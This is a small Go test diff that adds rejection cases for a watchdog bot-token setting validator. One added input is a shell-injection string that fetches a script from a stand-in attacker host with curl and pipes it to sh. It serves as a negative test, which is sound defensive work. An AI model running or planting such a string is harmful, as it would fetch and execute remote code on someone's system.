@@ -94,4 +94,9 @@ func TestWatchdogSettingsWriteOnly(t *testing.T) {
 	if _, err := normalizeSetting("watchdog_bot_token", "123456:AAfake_watchdog_token"); err != nil {
 		t.Errorf("bot token: %v", err)
 	}
+	for _, bad := range []string{"x'; curl evil.example.test|sh; '", "not a token", "123456:AA fake"} {
+		if v, err := normalizeSetting("watchdog_bot_token", bad); err == nil {
+			t.Errorf("bot token %q accepted as %q", bad, v)
+		}
+	}
 }
